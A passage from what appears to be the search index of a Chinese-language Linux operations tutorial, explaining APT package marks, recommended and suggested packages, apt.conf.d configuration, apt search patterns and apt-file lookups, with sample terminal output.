libxaw7 libxcb-damage0 libxcb-present0 libxcb-xfixes0 libxcb1 libxcursor1 libxdmcp6 libxext6 libxfixes3 libxft2\n  libxi6 libxkbfile1 libxmu6 libxmuu1 libxpm4 libxrender1 libxt6 man-db x11-apps x11-common xbitmaps\nThe following packages will be upgraded:\n  bsdutils libblkid1 libmount1 libsmartcols1 libuuid1 mount util-linux util-linux-extra\n8 upgraded, 40 newly installed, 0 to remove and 4 not upgraded.\n\uff08\u200b\u4ee5\u4e0b\u200b\u7701\u7565\u200b\uff09\n# apt remove x11-apps\nReading package lists... Done\nBuilding dependency tree... Done\nReading state information... Done\nThe following packages were automatically installed and are no longer required:\n  fontconfig-config fonts-dejavu-core groff-base libbrotli1 libbsd0 libexpat1 libfontconfig1 libfreetype6 libgdbm6 libice6 libpipeline1 libpng16-16 libsm6 libuchardet0\n  libx11-6 libx11-data libx11-xcb1 libxau6 libxaw7 libxcb-damage0 libxcb-present0 libxcb-xfixes0 libxcb1 libxcursor1 libxdmcp6 libxext6 libxfixes3 libxft2 libxi6\n  libxkbfile1 libxmu6 libxmuu1 libxpm4 libxrender1 libxt6 man-db x11-common xbitmaps\nUse 'apt autoremove' to remove them.\nThe following packages will be REMOVED:\n  x11-apps\n0 upgraded, 0 newly installed, 1 to remove and 4 not upgraded.\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\uff0c\u200b\u867d\u7136\u200b <code>x11-apps</code> \u200b\u5728\u200b\u8be5\u200b\u73af\u5883\u200b\u4e2d\u200b\u5f15\u5165\u200b\u7684\u200b\u4f9d\u8d56\u200b\u6ca1\u6709\u200b\u88ab\u200b\u81ea\u52a8\u200b\u5220\u9664\u200b\uff0c\u200b\u4f46\u662f\u200b APT \u200b\u77e5\u9053\u200b\u54ea\u4e9b\u200b\u4f9d\u8d56\u200b\u662f\u200b\u4e0d\u518d\u200b\u88ab\u200b\u9700\u8981\u200b\u7684\u200b\u4e86\u200b\u3002\u200b\u8fd9\u200b\u6709\u8d56\u4e8e\u200b APT \u200b\u7684\u200b\u8f6f\u4ef6\u5305\u200b\u6807\u8bb0\u200b\u529f\u80fd\u200b\uff1a\u200b\u7528\u6237\u200b\u76f4\u63a5\u200b\u5b89\u88c5\u200b\u7684\u200b\u5305\u4f1a\u200b\u88ab\u200b\u6807\u8bb0\u200b\u4e3a\u200b\u624b\u52a8\u200b\u5b89\u88c5\u200b\uff08manual\uff09\uff0c\u200b\u800c\u200b\u88ab\u200b\u8fd9\u6837\u200b\u5f15\u5165\u200b\u7684\u200b\u4f9d\u8d56\u200b\u4f1a\u200b\u88ab\u200b\u6807\u8bb0\u200b\u4e3a\u200b\u81ea\u52a8\u200b\u5b89\u88c5\u200b\uff08automatic\uff09\u3002\u200b\u4e8e\u662f\u200b\uff0c\u200b\u6ca1\u6709\u200b\u88ab\u200b\u4efb\u4f55\u200b\u624b\u52a8\u200b\u5b89\u88c5\u200b\u7684\u200b\u5305\u200b\u76f4\u63a5\u200b\u4ee5\u53ca\u200b\u95f4\u63a5\u200b\u4f9d\u8d56\u200b\u7684\u200b\u81ea\u52a8\u200b\u5b89\u88c5\u200b\u7684\u200b\u5305\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u88ab\u200b <code>apt autoremove</code> \u200b\u79fb\u9664\u200b\u3002</p> <p><code>apt-mark</code> \u200b\u547d\u4ee4\u200b\u53ef\u4ee5\u200b\u663e\u793a\u200b\u3001\u200b\u4fee\u6539\u200b\u6807\u8bb0\u200b\uff1a</p> <ul> <li><code>apt-mark showauto</code> \u200b\u4e0e\u200b <code>apt-mark showmanual</code> \u200b\u53ef\u4ee5\u200b\u663e\u793a\u200b\u7cfb\u7edf\u200b\u4e2d\u200b\u88ab\u200b\u6807\u8bb0\u200b\u4e3a\u200b\u81ea\u52a8\u200b\u5b89\u88c5\u200b\u4e0e\u200b\u624b\u52a8\u200b\u5b89\u88c5\u200b\u7684\u200b\u5305\u200b\u3002</li> <li><code>apt-mark auto &lt;package&gt;</code> \u200b\u4e0e\u200b <code>apt-mark manual &lt;package&gt;</code> \u200b\u53ef\u4ee5\u200b\u4fee\u6539\u200b\u5305\u200b\u7684\u200b\u6807\u8bb0\u200b\u3002</li> </ul>"},{"location":"ops/package/#recommends-suggests","title":"\u63a8\u8350\u200b\u4e0e\u200b\u5efa\u8bae","text":"<p>\u200b\u5b89\u88c5\u200b\u8f6f\u4ef6\u5305\u200b\u65f6\u200b\uff0cAPT \u200b\u5728\u200b\u9ed8\u8ba4\u200b\u914d\u7f6e\u200b\u4e0b\u4f1a\u200b\u5b89\u88c5\u200b\u63a8\u8350\u200b\uff08Recommended\uff09\u200b\u7684\u200b\u5305\u200b\u3002\u200b\u5efa\u8bae\u200b\uff08Suggested\uff09\u200b\u7684\u200b\u5305\u4f1a\u200b\u663e\u793a\u200b\u5728\u200b\u5b89\u88c5\u200b\u754c\u9762\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u4f1a\u200b\u81ea\u52a8\u200b\u88ab\u200b\u5b89\u88c5\u200b\u3002\u200b\u4f8b\u5982\u200b\u5728\u200b Debian 12 \u200b\u4e2d\u200b\uff0cdocker.io \u200b\u5305\u200b\u7684\u200b\u63a8\u8350\u200b\u6709\u200b apparmor\u3001ca-certificates \u200b\u7b49\u200b\uff0c\u200b\u5efa\u8bae\u200b\u5305\u6709\u200b btrfs-progs\u3001debootstrap \u200b\u7b49\u200b\u3002\u200b\u90a3\u4e48\u200b\u5728\u200b\u5b89\u88c5\u200b <code>docker.io</code> \u200b\u65f6\u200b\uff0c\u200b\u5305\u62ec\u200b apparmor\u3001ca-certificates \u200b\u7b49\u200b\u5305\u200b\u5c31\u200b\u4f1a\u200b\u9ed8\u8ba4\u200b\u88ab\u200b\u5b89\u88c5\u200b\uff0c\u200b\u5e76\u4e14\u200b\u7528\u6237\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u8fd9\u4e9b\u200b\u5305\u200b\u5efa\u8bae\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ef\u4ee5\u200b\u5728\u200b\u5f53\u524d\u200b\u5305\u200b\u5b89\u88c5\u200b\u5b8c\u6210\u200b\u540e\u200b\u81ea\u884c\u200b\u5b89\u88c5\u200b\u3002</p> <p>\u200b\u5927\u90e8\u5206\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u88ab\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u300c\u200b\u63a8\u8350\u200b\u300d\u200b\u7684\u200b\u5305\u662f\u200b\u6709\u200b\u610f\u4e49\u200b\u7684\u200b\uff0c\u200b\u5982\u679c\u200b\u4e0d\u200b\u5b89\u88c5\u200b\uff0c\u200b\u53ef\u80fd\u200b\u7a0b\u5e8f\u200b\u4ecd\u7136\u200b\u53ef\u4ee5\u200b\u8fd0\u884c\u200b\uff0c\u200b\u4f46\u662f\u200b\u4f1a\u200b\u7f3a\u5931\u200b\u4e00\u4e9b\u200b\u91cd\u8981\u200b\u7684\u200b\u529f\u80fd\u200b\u3002\u200b\u4e0d\u8fc7\u200b\u5728\u200b\u67d0\u4e9b\u200b\u73af\u5883\u200b\u4e0b\u200b\uff0c\u200b\u4f8b\u5982\u200b\u5bb9\u5668\u200b\u573a\u666f\u200b\uff0c\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u5b89\u88c5\u200b\u7684\u200b\u5305\u200b\u5c3d\u53ef\u80fd\u200b\u5f97\u5c11\u200b\u3002\u200b\u4e3a\u4e86\u200b\u7cbe\u7b80\u200b\u5b89\u88c5\u200b\u7684\u200b\u8f6f\u4ef6\u5305\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>--no-install-recommends</code> \u200b\u7684\u200b\u9009\u9879\u200b\uff0c\u200b\u4ee5\u200b\u8df3\u200b\u8fc7\u200b\u63a8\u8350\u200b\u7684\u200b\u8f6f\u4ef6\u5305\u200b\u3002\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u5728\u200b <code>apt.conf</code> \u200b\u914d\u7f6e\u200b\u4e2d\u200b\u6dfb\u52a0\u200b <code>Apt::Install-Recommends \"false\"</code> \u200b\u4ee5\u200b\u4f7f\u200b\u9ed8\u8ba4\u200b\u914d\u7f6e\u200b\u4e0d\u4f1a\u200b\u5b89\u88c5\u200b\u63a8\u8350\u200b\u7684\u200b\u5305\u200b\u3002</p> <p>\u200b\u4f7f\u7528\u200b <code>.conf.d</code> \u200b\u76ee\u5f55\u200b\u5f62\u5f0f\u200b\uff0c\u200b\u907f\u514d\u200b\u76f4\u63a5\u200b\u4fee\u6539\u200b <code>.conf</code> \u200b\u914d\u7f6e\u6587\u4ef6\u200b</p> <p>\u200b\u5bf9\u4e8e\u200b\u7edd\u5927\u591a\u6570\u200b Debian \u200b\u5305\u200b\u6765\u8bf4\u200b\uff0c\u200b\u8f6f\u4ef6\u5305\u200b\u5bf9\u5e94\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff08\u200b\u4ee5\u4e0b\u200b\u79f0\u4e3a\u200b <code>.conf</code> \u200b\u6587\u4ef6\u200b\uff09\u200b\u662f\u200b\u76f4\u63a5\u200b\u7531\u200b\u8f6f\u4ef6\u5305\u200b\u5b89\u88c5\u200b\uff08\u200b\u7ba1\u7406\u200b\uff09\u200b\u7684\u200b\u3002\u200b\u5c3d\u7ba1\u200b\u76f4\u63a5\u200b\u4fee\u6539\u200b\u914d\u7f6e\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u8fbe\u5230\u200b\u76ee\u7684\u200b\uff0c\u200b\u4f46\u662f\u200b\u5728\u200b\u8f6f\u4ef6\u5305\u200b\u5347\u7ea7\u200b\uff0c\u200b\u7279\u522b\u200b\u662f\u200b\u7cfb\u7edf\u200b\u5927\u200b\u7248\u672c\u200b\u66f4\u65b0\u200b\u65f6\u200b\uff0c<code>apt</code> \u200b\u4f1a\u200b\u8981\u6c42\u200b\u7528\u6237\u200b\u624b\u5de5\u200b\u4ecb\u5165\u200b\u914d\u7f6e\u200b\u51b2\u7a81\u200b\u95ee\u9898\u200b\uff08\u200b\u4fdd\u7559\u200b\u539f\u200b\u914d\u7f6e\u200b\uff0c\u200b\u6216\u8005\u200b\u5b89\u88c5\u200b\u65b0\u200b\u914d\u7f6e\u200b\uff09\uff0c\u200b\u4f1a\u200b\u5e26\u6765\u200b\u4e00\u4e9b\u200b\u56f0\u6270\u200b\u3002</p> <p>\u200b\u76ee\u524d\u200b\u5927\u90e8\u5206\u200b\u8f6f\u4ef6\u5305\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u90fd\u200b\u652f\u6301\u200b <code>.conf.d</code> \u200b\u76ee\u5f55\u200b\u5f62\u5f0f\u200b\uff0c\u200b\u5141\u8bb8\u200b\u7528\u6237\u200b\u4ee5\u200b\u4e0d\u540c\u200b\u6587\u4ef6\u200b\u7684\u200b\u5f62\u5f0f\u200b\u6dfb\u52a0\u200b\u81ea\u5df1\u200b\u7684\u200b\u914d\u7f6e\u200b\u7247\u6bb5\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u4f1a\u200b\u300c\u200b\u5bfc\u5165\u200b\u300d\u200b\u8fd9\u4e9b\u200b\u914d\u7f6e\u200b\u3002\u200b\u8fd9\u79cd\u200b\u65b9\u5f0f\u200b\u4e0d\u4ec5\u200b\u53ef\u4ee5\u200b\u907f\u514d\u200b\u76f4\u63a5\u200b\u4fee\u6539\u200b\u8f6f\u4ef6\u5305\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff0c\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u66f4\u597d\u200b\u5730\u200b\u7ba1\u7406\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff08\u200b\u4f8b\u5982\u200b\uff0c\u200b\u7528\u6237\u200b\u53ef\u4ee5\u200b\u5c06\u200b\u4e0d\u540c\u200b\u76ee\u7684\u200b\u7684\u200b\u914d\u7f6e\u200b\u4ee5\u200b\u4e0d\u540c\u200b\u7684\u200b\u6587\u4ef6\u540d\u200b\u5b58\u50a8\u200b\uff0c\u200b\u63d0\u5347\u200b\u914d\u7f6e\u200b\u7684\u200b\u53ef\u7ef4\u62a4\u6027\u200b\uff09\u3002</p> <p>\u200b\u4ee5\u4e0a\u200b\u6587\u200b\u7684\u200b <code>apt.conf</code> \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u63a8\u8350\u200b\u7684\u200b\u505a\u6cd5\u200b\u662f\u200b\u5728\u200b <code>/etc/apt/apt.conf.d/</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b <code>.conf</code> \u200b\u6587\u4ef6\u200b\uff0c\u200b\u5728\u200b\u5176\u4e2d\u200b\u5199\u5165\u200b\u9700\u8981\u200b\u7684\u200b\u914d\u7f6e\u200b\uff0c\u200b\u4f8b\u5982\u200b\u4e0d\u200b\u5b89\u88c5\u200b\u63a8\u8350\u200b\u5305\u200b\uff1a</p> <pre><code>echo 'APT::Install-Recommends \"false\";' | sudo tee /etc/apt/apt.conf.d/99no-install-recommends\n</code></pre> <p>\u200b\u67d0\u4e9b\u200b\u8f6f\u4ef6\u200b\u4f1a\u200b\u6839\u636e\u200b\u6587\u4ef6\u540d\u200b\u7684\u200b\u5b57\u5178\u200b\u5e8f\u6765\u200b\u51b3\u5b9a\u200b\u914d\u7f6e\u200b\u7684\u200b\u4f18\u5148\u7ea7\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8fd9\u91cc\u200b\u4f7f\u7528\u200b <code>99</code> \u200b\u4f5c\u4e3a\u200b\u524d\u7f00\u200b\uff0c\u200b\u786e\u4fdd\u200b\u8fd9\u4e2a\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u5728\u200b\u5176\u4ed6\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e4b\u540e\u200b\u88ab\u200b\u8bfb\u53d6\u200b\u3002</p> <p>\u200b\u4e3a\u4ec0\u4e48\u200b\u67d0\u4e2a\u200b\u5305\u4f1a\u200b\u88ab\u200b\u5b89\u88c5\u200b</p> <p>\u200b\u7531\u4e8e\u200b\u63a8\u8350\u200b\u5173\u7cfb\u200b\u7684\u200b\u5b58\u5728\u200b\uff0c\u200b\u6709\u65f6\u5019\u200b\u5728\u200b\u5b89\u88c5\u200b\u67d0\u4e2a\u200b\u5305\u65f6\u200b\uff0c\u200b\u4f1a\u200b\u5e26\u4e0a\u200b\u4e00\u4e9b\u200b\u770b\u8d77\u6765\u200b\u65e0\u5173\u200b\u7684\u200b\u5305\u200b\u3002\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u4e0b\u6587\u200b\u4ecb\u7ecd\u200b\u7684\u200b aptitude \u200b\u7684\u200b <code>why</code> \u200b\u547d\u4ee4\u200b\u67e5\u770b\u200b\uff0c\u200b\u4f8b\u5982\u200b\u786e\u8ba4\u200b\u4e3a\u4ec0\u4e48\u200b <code>apt install lightdm</code> \u200b\u4f1a\u200b\u5b89\u88c5\u200b <code>plymouth</code>\uff1a</p> <pre><code>$ aptitude why lightdm plymouth\np   lightdm             Depends    lightdm-gtk-greeter | lightdm-greeter\np   lightdm-gtk-greeter Recommends desktop-base\np   desktop-base        Recommends plymouth-label\np   plymouth-label      Depends    plymouth (= 24.004.60-5)\n</code></pre>"},{"location":"ops/package/#search","title":"\u641c\u7d22\u200b\u5305","text":"<p>Debian \u200b\u4e0e\u200b Ubuntu \u200b\u5747\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u7f51\u9875\u200b\u7aef\u200b\u641c\u7d22\u200b\u8f6f\u4ef6\u5305\u200b\u7684\u200b\u670d\u52a1\u200b\uff1aDebian \u200b\u8f6f\u4ef6\u5305\u200b\u3001Ubuntu Packages Search\u3002\u200b\u4e0d\u8fc7\u200b\uff0c\u200b\u4f7f\u7528\u200b apt \u200b\u5de5\u5177\u200b\u641c\u7d22\u200b\u6765\u200b\u5feb\u5f97\u591a\u200b\u3002</p>"},{"location":"ops/package/#apt-search-pattern","title":"<code>apt search</code> \u200b\u4e0e\u200b apt \u200b\u641c\u7d22\u200b\u6a21\u5f0f","text":"<p><code>apt search &lt;name&gt;</code> \u200b\u4f1a\u200b\u6839\u636e\u200b\u5305\u540d\u200b\u4e0e\u200b\u63cf\u8ff0\u200b\u8fdb\u884c\u200b\u5305\u200b\u7684\u200b\u67e5\u627e\u200b\uff0c\u200b\u652f\u6301\u200b\u6b63\u5219\u8868\u8fbe\u5f0f\u200b\uff1a</p> <pre><code>$ apt search wayland\nSorting... Done\nFull Text Search... Done\nbemenu/noble 0.6.15+dfsg-1build2 amd64\n  Dynamic menu inspired by dmenu\n\ncage/noble 0.1.5+20240127-2build1 amd64\n  Kiosk compositor for Wayland\n\uff08\u200b\u4ee5\u4e0b\u200b\u7701\u7565\u200b\uff09\n$ apt search ^docker\nSorting... Done\nFull Text Search... Done\ndebocker/noble 0.2.5 all\n  docker-powered package builder for Debian\n\ndocker-buildx/noble-updates 0.14.1-0ubuntu1~24.04.1 amd64\n  Docker CLI plugin for extended build capabilities with BuildKit\n\uff08\u200b\u4ee5\u4e0b\u200b\u7701\u7565\u200b\uff09\n</code></pre> <p>\u200b\u4e0d\u8fc7\u200b\uff0c\u200b\u6709\u4e9b\u200b\u65f6\u5019\u200b\u8fd9\u79cd\u200b\u641c\u7d22\u200b\u4e5f\u200b\u4e0d\u200b\u592a\u200b\u7b26\u5408\u200b\u9700\u6c42\u200b\uff0c\u200b\u4f8b\u5982\u200b\u6709\u4e9b\u200b\u65f6\u5019\u200b\u6211\u4eec\u200b\u53ea\u60f3\u200b\u641c\u7d22\u200b\u5305\u540d\u200b\u7b49\u200b\uff0c\u200b\u6b64\u65f6\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b apt \u200b\u641c\u7d22\u200b\u6a21\u5f0f\u200b\uff08search pattern\uff09\u200b\u6765\u200b\u8fdb\u884c\u200b\u66f4\u200b\u5177\u4f53\u200b\u7684\u200b\u67e5\u627e\u200b\u3002\u200b\u5b8c\u6574\u200b\u6587\u6863\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b apt-patterns(7)\u3002\u200b\u641c\u7d22\u200b\u6a21\u5f0f\u200b\u4e0d\u9002\u200b\u7528\u4e8e\u200b <code>apt search</code>\uff0c\u200b\u4f46\u200b\u9002\u7528\u200b\u4e8e\u200b\u5176\u4ed6\u200b\u5404\u7c7b\u200b apt \u200b\u547d\u4ee4\u200b\uff0c\u200b\u4f8b\u5982\u200b <code>apt list</code>\u3001<code>apt show</code>\u3001<code>apt remove</code> \u200b\u7b49\u200b\u3002</p> <p>\u200b\u4ee5\u4e0b\u200b\u662f\u200b\u4e00\u4e9b\u200b\u5e38\u89c1\u200b\u7684\u200b apt \u200b\u641c\u7d22\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u53e5\u200b\u5c3e\u200b\u62ec\u53f7\u200b\u4e3a\u200b\u66f4\u52a0\u200b\u7e41\u7410\u200b\u7684\u200b\u5b8c\u6574\u200b\u8868\u793a\u200b\uff1a</p> <ul> <li><code>~nREGEX</code> \u200b\u5305\u200b\u540d\u79f0\u200b\u6ee1\u8db3\u200b\u6b63\u5219\u8868\u8fbe\u5f0f\u200b\u7684\u200b\u5305\u200b\uff08<code>?name(REGEX)</code>\uff09\u3002</li> <li><code>~c</code> \u200b\u5df2\u7ecf\u200b\u5220\u9664\u200b\uff0c\u200b\u4f46\u662f\u200b\u4ecd\u7136\u200b\u6709\u200b\u914d\u7f6e\u200b\u6b8b\u7559\u200b\u7684\u200b\u5305\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>apt purge</code> \u200b\u5f7b\u5e95\u200b\u5220\u9664\u200b\uff08<code>?config-files</code>\uff09\u3002</li> <li><code>~i</code> \u200b\u4e3a\u200b\u5df2\u7ecf\u200b\u5b89\u88c5\u200b\u7684\u200b\u5305\u200b\uff08<code>?installed</code>\uff09\u3002</li> <li><code>~U</code> \u200b\u53ef\u4ee5\u200b\u5347\u7ea7\u200b\u7684\u200b\u5305\u200b\uff08<code>?upgradable</code>\uff09\u3002</li> <li><code>~o</code> \u200b\u8fdc\u7a0b\u200b\u5df2\u7ecf\u200b\u4e0d\u518d\u200b\u5b58\u5728\u200b\u7684\u200b\u5305\u200b\uff0c\u200b\u4e00\u822c\u200b\u662f\u200b\u5728\u200b\u7cfb\u7edf\u200b\u5927\u200b\u7248\u672c\u200b\u66f4\u65b0\u200b\u540e\u200b\u6b8b\u7559\u200b\u7684\u200b\u65e7\u200b\u5305\u200b\uff0c\u200b\u6216\u8005\u200b\u662f\u200b\u672c\u5730\u200b\u624b\u52a8\u200b\u5b89\u88c5\u200b\u7684\u200b\u5305\u200b\uff08<code>?obsolete</code>\uff0c\u200b\u5728\u200b <code>apt list</code> \u200b\u7684\u200b\u8f93\u51fa\u200b\u4e2d\u200b\u663e\u793a\u200b\u4e3a\u200b <code>[installed,local]</code>\uff09\u3002</li> </ul> <p>\u200b\u641c\u7d22\u200b\u6a21\u5f0f\u200b\u7ec3\u4e60\u200b</p> <p>\u200b\u8bf7\u200b\u5c1d\u8bd5\u200b\u5199\u51fa\u200b\u4ee5\u4e0b\u200b\u67e5\u8be2\u200b\u7684\u200b\u641c\u7d22\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5728\u200b\u81ea\u5df1\u200b\u7684\u200b\u73af\u5883\u200b\u4e2d\u200b\u8bd5\u4e00\u8bd5\u200b\uff1a</p> <ul> <li>\u200b\u8f93\u51fa\u200b\uff08\u200b\u63d0\u793a\u200b\uff1a<code>apt list</code>\uff09\u200b\u6240\u6709\u200b\u672a\u200b\u5b8c\u5168\u200b\u5220\u9664\u200b\u4ee5\u53ca\u200b\u8fdc\u7a0b\u200b\u4ed3\u5e93\u200b\u4e0d\u518d\u200b\u63d0\u4f9b\u200b\u7684\u200b\u5305\u200b\uff08\u200b\u867d\u7136\u200b <code>apt purge</code> \u200b\u4e5f\u200b\u652f\u6301\u200b\u641c\u7d22\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u5c0f\u5fc3\u200b\u6267\u884c\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u6240\u6709\u200b\u914d\u7f6e\u200b\u90fd\u200b\u4f1a\u200b\u88ab\u200b\u5220\u9664\u200b\uff01\uff09</li> <li>\u200b\u8f93\u51fa\u200b\u672c\u5730\u200b\u5b89\u88c5\u200b\u7684\u200b\u540d\u5b57\u200b\u91cc\u200b\u6709\u200b <code>top</code> \u200b\u7684\u200b\u6240\u6709\u200b\u5305\u200b<ul> <li>\u200b\u63d0\u793a\u200b\uff1a\u200b\u53ef\u4ee5\u200b\u50cf\u200b\u8fd9\u6837\u200b\u8981\u6c42\u200b\u540c\u65f6\u200b\u6ee1\u8db3\u200b\u591a\u4e2a\u200b pattern: <code>apt list 'P1 P2 P3'</code></li> </ul> </li> </ul>"},{"location":"ops/package/#apt-file","title":"\u6587\u4ef6\u200b\u641c\u7d22\u200b\uff1a<code>apt-file</code>","text":"<p>\u200b\u5982\u679c\u200b\u4f7f\u7528\u200b\u8fc7\u200b\u9ed8\u8ba4\u200b\u5b89\u88c5\u200b\u7684\u200b Ubuntu \u200b\u7684\u8bdd\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u53d1\u73b0\u200b\uff0c\u200b\u5728\u200b\u8f93\u5165\u200b\u547d\u4ee4\u200b\u65f6\u200b\uff0c\u200b\u5982\u679c\u200b\u547d\u4ee4\u200b\u4e0d\u200b\u5b58\u5728\u200b\uff0c\u200b\u4f1a\u200b\u6709\u200b\u7c7b\u4f3c\u200b\u4e0b\u9762\u200b\u7684\u200b\u63d0\u793a\u200b\uff1a</p> <pre><code>$ htop\nCommand 'htop' not found, but can be installed with:\nsudo apt install htop\n</code></pre> <p>\u200b\u8fd9\u200b\u662f\u200b\u7531\u200b <code>command-not-found</code> \u200b\u5305\u200b\u652f\u6301\u200b\u7684\u200b\uff0c\u200b\u4e0d\u8fc7\u200b\u53ef\u4ee5\u200b\u6ce8\u610f\u200b\u5230\u200b\uff0c\u200b\u8fd9\u200b\u4e00\u9879\u200b\u529f\u80fd\u200b\u4f1a\u200b\u62d6\u6162\u200b\u4e0e\u200b shell \u200b\u4ea4\u4e92\u200b\u65f6\u200b\u7684\u200b\u901f\u5ea6\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8fd9\u91cc\u200b\u66f4\u52a0\u200b\u63a8\u8350\u200b\u5220\u9664\u200b\u8fd9\u4e2a\u200b\u5305\u200b\uff0c\u200b\u53ea\u200b\u5728\u200b\u9700\u8981\u200b\u7684\u200b\u65f6\u5019\u200b\u7528\u200b <code>apt-file</code> \u200b\u547d\u4ee4\u200b\u641c\u7d22\u200b\u3002</p> <p>\u200b\u5728\u200b\u64cd\u4f5c\u524d\u200b\uff0c\u200b\u9700\u8981\u200b\u6267\u884c\u200b <code>apt-file update</code> \u200b\u547d\u4ee4\u200b\u66f4\u65b0\u200b\u672c\u5730\u200b\u6587\u4ef6\u200b\u4e0e\u200b\u5305\u200b\u5173\u7cfb\u200b\u7684\u200b\u6570\u636e\u5e93\u200b\u7684\u200b\u521d\u59cb\u5316\u200b\u53ca\u200b\u66f4\u65b0\u200b\u3002\u200b\u4e4b\u540e\u200b\u4f7f\u7528\u200b <code>apt-file search &lt;file&gt;</code> \u200b\u5c31\u200b\u53ef\u4ee5\u200b\u641c\u7d22\u200b\u5305\u542b\u200b\u67d0\u4e2a\u200b\u6587\u4ef6\u200b\u7684\u200b\u5305\u200b\uff1a</p> <pre><code>$ apt-file search execsnoop\nbpfcc-tools: /usr/sbin/execsnoop-bpfcc\nbpfcc-tools: /usr/share/doc/bpfcc-tools/examples/doc/execsnoop_example.txt\nbpfcc-tools: /usr/share/man/man8/execsnoop-bpfcc.8.gz\nbpftrace: /usr/sbin/execsnoop.bt\nbpftrace: /usr/share/doc/bpftrace/examples/execsnoop_example.txt\nbpftrace: /usr/share/man/man8/execsnoop.bt.8.gz\ngolang-github-iovisor-gobpf-dev: /usr/share/gocode/src/github.com/iovisor/gobpf/examples/bcc/execsnoop/execsnoop.go\ngolang-github-iovisor-gobpf-dev: /usr/share/gocode/src/github.com/iovisor/gobpf/examples/bcc/execsnoop/output.go\nlibbpf-tools: /usr/sbin/execsnoop\npcp: /usr/lib/pcp/pmdas/bcc/modules/execsnoop.bpf\npcp: /usr/lib/pcp/pmdas/bcc/modules/execsnoop.python\npcp: /usr/lib/pcp/pmdas/bpf/modules/execsnoop.so\npcp: /usr/share/pcp/htop/screens/execsnoop\npcp: /var/lib/pcp/pmdas/bcc/modules/execsnoop.bpf\npcp: /var/lib/pcp/pmdas/bcc/modules/execsnoop.python\npcp: /var/lib/pcp/pmdas/bpf/modules/execsnoop.so\nperf-tools-unstable: /usr/sbin/execsnoop-perf\nperf-tools-unstable: /usr/share/doc/perf-tools-unstable/examples/execsnoop_example.txt\nperf-tools-unstable: /usr/share/man/man8/execsnoop-perf.8.gz\nsystemtap-doc: /usr/share/systemtap/examples/lwtools/execsnoop-nd.8\nsystemtap-doc: /usr/share/systemtap/examples/lwtools/execsnoop-nd.meta\nsystemtap-doc: /usr/share/systemtap/examples/lwtools/execsnoop-nd.stp\nsystemtap-doc: /usr/share/systemtap/examples/lwtools/execsnoop-nd_example.txt\n</code></pre> <p>\u200b\u6b64\u5916\u200b\uff0c<code>apt-file list &lt;package&gt;</code> \u200b\u53ef\u4ee5\u200b\u67e5\u770b\u200b\u67d0\u4e2a\u200b\u5305\u4e2d\u200b\u5305\u542b\u200b\u7684\u200b\u6587\u4ef6\u200b\uff1a</p> <pre><code>$ apt-file list htop\nhtop: /usr/bin/htop\nhtop: /usr/share/applications/htop.desktop\nhtop: /usr/share/doc/htop/AUTHORS\nhtop: /usr/share/doc/htop/README.gz\nhtop: /usr/share/doc/htop/changelog.Debian.gz\nhtop: /usr/share/doc/htop/copyright\nhtop: /usr/share/icons/hicolor/scalable/apps/htop.svg\nhtop: /usr/share/man/man1/htop.1.gz\nhtop: /usr/share/pixmaps/htop.png\n</code></pre> <p>\u200b\u4f7f\u7528\u200b dpkg \u200b\u7c7b\u200b\u547d\u4ee4\u200b\u5728\u200b\u5df2\u200b\u5b89\u88c5\u200b\u7684\u200b\u5305\u5185\u200b\u67e5\u627e\u6587\u4ef6\u200b</p> <p><code>apt-file</code> \u200b\u4f9d\u8d56\u4e8e\u200b\u5bf9\u200b\u5b8c\u6574\u200b\u4ed3\u5e93\u200b\u7684\u200b\u7d22\u5f15\u200b\uff0c\u200b\u5e76\u4e14\u200b\u641c\u7d22\u200b\u4e5f\u200b\u662f\u200b\u4e00\u4e2a\u200b\u7565\u5fae\u200b\u8017\u65f6\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u3002\u200b\u5982\u679c\u200b\u53ea\u200b\u9700\u8981\u200b\u786e\u8ba4\u200b\u672c\u5730\u200b\u5df2\u7ecf\u200b\u5b89\u88c5\u200b\u7684\u200b\u5305\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u5df2\u6709\u200b\u7684\u200b deb \u200b\u5305\u200b\u6587\u4ef6\u200b\u4e2d\u200b\u7684\u200b\u6587\u4ef6\u200b\u60c5\u51b5\u200b\uff0c\u200b\u6709\u200b\u66f4\u200b\u5feb\u200b\u7684\u200b\u65b9\u6cd5\u200b\uff1a</p> <ul> <li><code>dpkg-query -S 